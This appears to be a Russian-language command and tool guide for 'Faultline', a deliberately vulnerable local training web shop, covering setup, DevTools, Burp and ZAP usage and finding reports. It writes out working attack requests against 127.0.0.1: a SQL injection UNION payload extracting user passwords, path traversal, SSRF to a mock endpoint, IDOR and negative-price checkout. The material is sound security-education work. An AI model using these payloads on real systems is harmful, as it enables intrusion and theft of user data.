# Команды: Windows и Arch Linux

Все команды предназначены для собственной копии этого проекта. Основной сервер — `127.0.0.1:3000`, mock warehouse — `127.0.0.1:3001`. Скрипт проверки сначала проверяет маркер лаборатории; произвольный удалённый адрес не поддерживается.

## Windows / PowerShell

Установите Node.js 24 или новее, если он отсутствует. Команда установки требует обычного разрешения установщика:

```powershell
winget install OpenJS.NodeJS.LTS
```

Откройте новую консоль в папке проекта:

```powershell
node --version
node server.mjs
```

Альтернатива: `powershell -File scripts/start-windows.ps1`. Если политика PowerShell запрещает скрипт, используйте `node server.mjs`; менять системную execution policy не требуется.

Во второй консоли:

```powershell
node --test tests/lab.test.mjs
node scripts/verify.mjs
Get-NetTCPConnection -State Listen -LocalPort 3000,3001 |
  Select-Object LocalAddress,LocalPort,OwningProcess
Invoke-RestMethod 'http://127.0.0.1:3000/api/health'
```

Вход и запрос чужого заказа:

```powershell
$labSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$loginBody = @{email='alice@lab.test'; password='alice123'} | ConvertTo-Json
Invoke-RestMethod -Uri 'http://127.0.0.1:3000/api/login' -Method Post `
  -ContentType 'application/json' -Body $loginBody -WebSession $labSession
Invoke-RestMethod -Uri 'http://127.0.0.1:3000/api/orders/2' -WebSession $labSession
```

Проверка стоимости:

```powershell
$orderBody = @{total=-100; address='DEMO'} | ConvertTo-Json
Invoke-RestMethod -Uri 'http://127.0.0.1:3000/api/checkout' -Method Post `
  -ContentType 'application/json' -Body $orderBody -WebSession $labSession
```

SQL в поиске, файл и mock SSRF:

```powershell
$labPayload = [Uri]::EscapeDataString("' UNION SELECT id,email,password,id,role,5 FROM users -- ")
Invoke-RestMethod ("http://127.0.0.1:3000/api/products?q=" + $labPayload)
Invoke-RestMethod 'http://127.0.0.1:3000/api/download?file=../secret.txt'
Invoke-RestMethod 'http://127.0.0.1:3000/api/import?url=http%3A%2F%2F127.0.0.1%3A3001%2Fsecret'
```

## Arch Linux / Bash

Установка системных пакетов выполняется самим пользователем. После установки проверьте, что версия Node не ниже 24:

```bash
sudo pacman -Syu nodejs npm curl
node --version
bash scripts/start-arch.sh
```

Во второй консоли:

```bash
node --test tests/lab.test.mjs
bash scripts/verify-arch.sh
ss -ltnp '( sport = :3000 or sport = :3001 )'
curl --fail-with-body http://127.0.0.1:3000/api/health
```

Вход и IDOR (cookie-файл содержит только учебную сессию):

```bash
curl --fail-with-body -c /tmp/faultline-demo.cookies \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@lab.test","password":"alice123"}' \
  http://127.0.0.1:3000/api/login
curl --fail-with-body -b /tmp/faultline-demo.cookies \
  http://127.0.0.1:3000/api/orders/2
curl --fail-with-body -b /tmp/faultline-demo.cookies \
  -H 'Content-Type: application/json' \
  -d '{"total":-100,"address":"DEMO"}' \
  http://127.0.0.1:3000/api/checkout
```

Файл, сеть, заголовки:

```bash
curl --fail-with-body 'http://127.0.0.1:3000/api/download?file=../secret.txt'
curl --fail-with-body --get --data-urlencode 'url=http://127.0.0.1:3001/secret' \
  http://127.0.0.1:3000/api/import
curl -D - -o /dev/null http://127.0.0.1:3000/
```

## Общие команды

```sh
node --check server.mjs
node --check public/app.js
npm test
```

Поиск мест в коде (если установлен ripgrep):

```sh
rg -n 'LAB:|innerHTML|Set-Cookie|db.prepare|writeFileSync|fetch\(' server.mjs public/app.js
```

После `Ctrl+C` в консоли сервера:

```sh
npm run reset
npm start
```

`verify` изменяет текущую БД, `test` использует временную. Windows проверен здесь на Node 24.15.0; Bash-обёртки подготовлены для Arch, но запуск на Arch в этой сессии не выполнялся. Для остальных точечных проверок используйте кроссплатформенные Console-команды из отчётов участников в `docs/reports/`.

## Функция для браузерных проверок

На странице магазина откройте DevTools → Console и выполните:

```js
const lab = async (route, data) => {
  if (location.origin !== 'http://127.0.0.1:3000') throw Error('Откройте свой стенд');
  const response = await fetch(route, data === undefined ? {} : {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify(data)
  });
  const text = await response.text();
  console.log(response.status, text);
  try { return JSON.parse(text); } catch { return text; }
};
```

# Инструменты: куда нажимать и куда вводить команды

Цель работы — не нажать «сканировать всё», а понять связь между вводом, HTTP-запросом, кодом и результатом. Все примеры разрешены только для `http://127.0.0.1:3000` в вашей копии Faultline.

## Что установить

Обязателен только Node.js 24+. Для первых заданий достаточно браузера и его DevTools.

| Инструмент | Для чего | Куда вводить |
|---|---|---|
| Browser DevTools → Network | Смотреть URL, метод, заголовки, cookie, JSON и статус | `F12` → вкладка Network → клик по запросу |
| Browser DevTools → Console | Отправлять маленькие `fetch`-запросы и проверять DOM | `F12` → вкладка Console → строка `>` |
| PowerShell | Повторять запросы на Windows | Windows Terminal → PowerShell |
| curl | Повторять запросы на Arch/Linux | Терминал Bash |
| Burp Suite Community | Перехватить запрос, изменить и повторить | Proxy → HTTP history → Send to Repeater → Repeater |
| OWASP ZAP | Просмотреть дерево URL и вручную повторять запросы | Quick Start → Manual Explore; затем History/Requester |
| `rg` | Найти опасные функции в исходниках | Терминал в корне проекта |
| SQLite CLI (необязательно) | Посмотреть, что реально записалось в БД | Терминал после остановки сервера |

Burp и ZAP необязательны. Сначала выполните по одному заданию через Network/Console, затем повторите то же в прокси — так понятнее, что именно инструмент автоматизирует.

## Шаг 1. Как открыть папку и запустить сайт на Windows

1. Нажмите значок жёлтой папки на панели задач — откроется **Проводник**.
2. Щёлкните один раз по адресной строке Проводника вверху окна.
3. Вставьте путь `путь к вашей локальной копии проекта` и нажмите Enter.
4. Убедитесь, что в папке видны `server.mjs`, `README.md`, папки `public` и `docs`.
5. Ещё раз щёлкните по адресной строке, сотрите путь, напишите `powershell` и нажмите Enter.
6. Откроется синее или чёрное окно терминала. Внизу должна мигать строка после символа `>`.
7. Напечатайте `npm start` и нажмите Enter.
8. Правильный результат: строка `Faultline Shop: http://127.0.0.1:3000`.
9. Не закрывайте это окно: пока оно открыто, работает сайт. Остановить сервер можно сочетанием Ctrl+C.

Если написано «npm не является командой», Node.js не установлен либо после установки не была открыта новая консоль. Если написано `EADDRINUSE`, сайт уже запущен в другом окне — новый экземпляр не нужен.

## Шаг 2. Как открыть сайт

1. Откройте Chrome или Edge.
2. Щёлкните по длинному полю адреса в самом верху браузера.
3. Введите `http://127.0.0.1:3000`.
4. Нажмите Enter.
5. Должен открыться магазин Faultline с зелёной полоской «УЧЕБНЫЙ СТЕНД».
6. Если браузер показывает страницу «Не удаётся получить доступ», вернитесь к шагу 1 и проверьте, что терминал с сервером всё ещё открыт.

## Шаг 3. Как открыть документацию

Откройте `docs/README.md`, затем выберите свою папку в `docs/reports/`. Подготовка и инструменты собраны в текущем файле.

## Шаг 4. Как открыть DevTools в Chrome или Edge

1. Перейдите на вкладку браузера с магазином.
2. Нажмите F12. На ноутбуке может потребоваться Fn+F12.
3. Если F12 не сработала, нажмите Ctrl+Shift+I.
4. Справа или снизу откроется дополнительная панель. Это **DevTools**.
5. В верхней строке панели видны вкладки Elements, Console, Sources, Network. Если Network не видно, нажмите значок `»` справа от названий.
6. Ширину панели можно менять: подведите мышь к её левой границе и потяните.

В Firefox клавиши те же, вкладки называются «Консоль» и «Сеть». Примеры ниже ориентированы на Chrome/Edge.

## Шаг 5. Где находится Console и куда вставлять JavaScript

1. В верхней строке DevTools нажмите **Console**.
2. Внизу панели найдите строку со знаком `>` слева и мигающим курсором справа от него.
3. Щёлкните мышью именно после знака `>`.
4. Вставьте функцию `lab`, приведённую ниже, целиком.
5. Нажмите Enter один раз.
6. Если Console показала `undefined`, это нормально: функция создана.
7. В следующую строку после нового знака `>` вставьте `await lab('/api/health')` и нажмите Enter.
8. Правильный результат содержит `STATUS 200` и `faultline-local-only`.

Если браузер показывает предупреждение о вставке, не вводите предложенные в интернете обходные команды. Прочитайте текст самого браузера и вручную наберите разрешающую фразу, которую он показывает. Вставляйте только команды из своей папки `docs`.

## Шаг 6. Где находится Network и как смотреть запрос

1. В DevTools нажмите **Network**. Если список пустой, это нормально.
2. Нажмите фильтр **Fetch/XHR** над таблицей. Теперь будут видны запросы магазина к API.
3. Нажмите значок очистки в левом верхнем углу панели Network. Обычно он похож на перечёркнутый круг.
4. Не закрывая DevTools, в самом магазине нажмите кнопку «Войти».
5. В таблице Network появятся строки `login`, `me`, `orders`.
6. Один раз щёлкните строку `login`.
7. Справа появятся вкладки Headers, Payload, Preview, Response.
8. **Headers** показывает адрес, метод и заголовки. Ищите `Request URL`, `Request Method`, `Status Code`.
9. **Payload** показывает отправленные поля `email` и `password`.
10. **Response** показывает ответ сервера. В уязвимом стенде там видны `id`, `email`, `password`, `role`.
11. Чтобы повторить запрос, щёлкните правой кнопкой по строке `login` → **Copy** → **Copy as fetch**. Вставьте результат во вкладку Console.

Если строка `login` не появилась, убедитесь, что слева сверху красный круг записи активен, фильтр текста пуст, а выбран Fetch/XHR.

## Подготовка через терминал

В первой консоли из корня проекта:

```text
npm start
```

В браузере откройте строго `http://127.0.0.1:3000`. Проверьте `http://127.0.0.1:3000/api/health`: должен быть JSON с `faultline-local-only`.

Во второй консоли можно проверить чистую временную копию:

```text
npm test
```

`npm run verify` работает с текущей БД и намеренно меняет её. Для первого знакомства используйте `npm test`.

## Повторение: Network — найти запрос, который делает интерфейс

1. Нажмите `F12`, откройте **Network**.
2. Включите фильтр **Fetch/XHR** и очистите список.
3. В магазине войдите Алисой.
4. В списке появится `login`. Нажмите его.
5. В **Headers** найдите Request URL, Request Method и Request Payload.
6. В **Response** найдите JSON пользователя.
7. Правой кнопкой по строке → **Copy → Copy as fetch** или **Copy as cURL**.
8. Вставьте копию в текстовый файл отчёта. Удалите лишние browser-заголовки. Никогда не копируйте реальные cookie; здесь cookie учебная.

Что записать: обычный запрос, статус, три важных поля ответа. Затем измените ровно один параметр и сравните результат. Network фиксирует запросы, пока панель открыта; официальный справочник Chrome описывает колонки Status, Type и Initiator: [Chrome DevTools Network](https://developer.chrome.com/docs/devtools/network/reference).

## Способ 2: Console — куда вставлять примеры из документации

1. Оставаясь на странице магазина, откройте **Console**.
2. Если браузер показывает предупреждение о вставке кода, не обходите его вслепую: вручную напечатайте короткую строку `1+1`, затем следуйте подсказке самого браузера.
3. Скопируйте функцию `lab` из раздела «Функция для браузерных проверок» в этом файле целиком, вставьте в строку `>` и нажмите Enter.
4. Вставляйте команды вида `await lab('/api/...')` из карточек уязвимостей.
5. `200` означает, что запрос обработан, но не доказывает уязвимость. Доказательство — конкретное запрещённое состояние: чужой `user_id`, роль `admin`, отрицательная цена, секрет fixture или исполненный DOM-маркер.

## Способ 3: Burp Community — перехват и Repeater

1. Запустите Burp, создайте temporary project.
2. Proxy → Intercept → **Open browser**. Встроенный браузер уже настроен на прокси.
3. Откройте `http://127.0.0.1:3000`. Если запросы зависли, выключите **Intercept on** после первого просмотра.
4. Proxy → **HTTP history** → выберите, например, `POST /api/login`.
5. Правой кнопкой → **Send to Repeater**.
6. В Repeater меняйте только JSON между пустой строкой и последней `}`. Нажмите **Send**.
7. Слева остаётся запрос, справа — статус, заголовки и тело ответа. Сохраните скрин или скопируйте request/response в отчёт.

Официальная инструкция PortSwigger показывает тот же поток: встроенный браузер, Intercept, Forward и HTTP history: [Intercepting HTTP traffic](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic). Scope задайте как `http://127.0.0.1:3000`; не запускайте проверки по другим адресам.

## Способ 4: OWASP ZAP — ручное исследование

1. Quick Start → **Manual Explore**.
2. URL: `http://127.0.0.1:3000`, затем Launch Browser.
3. Выполните вход и покупку во встроенном браузере.
4. В History найдите нужный запрос; откройте его в Requester/Manual Request Editor.
5. Измените один параметр и отправьте повторно.
6. Для этой лаборатории не нужен active scan: все задания воспроизводятся вручную, а обучение строится вокруг понимания запроса.

## Способ 5: терминал

Готовые команды для Windows и Arch находятся в [commands.md](commands.md). У curl важны четыре флага: `-i` показывает заголовки, `-H` задаёт заголовок, `-d` отправляет тело, `-b/-c` читает и сохраняет cookie. Актуальный синтаксис описан в [официальной man page curl](https://curl.se/docs/manpage.html).

## Как искать в исходниках

Из корня проекта:

```sh
rg -n "LAB:|innerHTML|writeHead|Set-Cookie|db.prepare|writeFileSync|fetch\(" server.mjs public/app.js
```

Читайте поток данных слева направо:

```text
параметр URL / JSON → переменная → запрос к БД или HTML/file sink → HTTP-ответ → действие браузера
```

Ищите места, где данные пользователя становятся кодом или путём: шаблонная строка SQL, `innerHTML`, `Location`, имя файла, CSV-ячейка. Затем ищите отсутствующую проверку: сессия, роль, владелец, допустимый статус, положительная цена.

## Как оформить доказательство

На каждую находку создайте один Markdown-файл в `docs/reports/<ваше-имя>/ID.md`:

```md
# ACCESS-01: чтение чужого заказа

- Роль: alice / customer
- Обычный запрос: GET /api/orders/1
- Изменение: id 1 → 2
- Ожидалось: 403 или 404
- Получено: 200, user_id=2
- Влияние в стенде: адрес и сумма Бориса
- Код: server.mjs, маршрут /api/orders/:id
- Причина: запрос фильтрует id, но не user_id
- Исправление: WHERE id=? AND user_id=?
- Проверка после исправления: заказ 1 виден, заказ 2 запрещён
```

Не пишите «полный захват сервера», если стенд показал только чтение fixture. Отделяйте наблюдаемое влияние от возможного боевого риска.

## Как понять, что исправление настоящее

Для каждого фикса нужны две проверки:

1. Негативная: старый изменённый запрос больше не достигает запрещённого результата.
2. Позитивная: обычный вход, поиск, покупка или админское действие всё ещё работает.

После исправления намеренно уязвимый `npm test` может упасть — это ожидаемо. Замените assertion «атака проходит» на assertion правильного отказа в отдельной локальной копии. Не удаляйте проверку без замены.
